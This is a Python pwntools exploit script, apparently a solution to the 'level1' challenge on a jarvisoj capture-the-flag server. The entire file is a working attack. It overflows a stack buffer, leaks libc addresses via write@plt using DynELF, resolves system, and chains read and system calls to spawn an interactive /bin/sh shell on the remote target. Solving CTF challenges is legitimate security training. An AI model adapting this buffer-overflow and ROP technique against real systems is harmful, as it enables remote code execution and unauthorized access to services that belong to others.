from pwn import *


DEBUG = 0
if DEBUG:
	context.log_level = 'debug'
	p = process('./level1')
	gdb.attach(p)
else:
	p = remote("pwn2.jarvisoj.com",9877)

elf = ELF('level1')
main_addr = 0x080484b7
got_write = elf.got['write']
plt_write = elf.plt['write']


def leak(addr):	
	payload = 'a' * 0x88 + 'b' * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
	p.sendline(payload)
	data = p.recv(4)
	print hex(u32(data))
	print "%#x => %s" % (addr,(data or '').encode('hex'))
	return data

d = DynELF(leak,elf=ELF('./level1'))
system_addr = d.lookup('system','libc')

print "system_addr: " + hex(system_addr)


#p.recvline()
bin_sh_addr = 0x0804a02c - 100
pop_pop_pop_ret = 0x08048549
plt_read = elf.plt['read']

payload = 'a' * 0x88 + 'a' * 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bin_sh_addr) + p32(8)
payload += p32(system_addr) + p32(1) + p32(bin_sh_addr)

sleep(2)

p.sendline(payload)
p.sendline('/bin/sh\x00')

p.interactive()
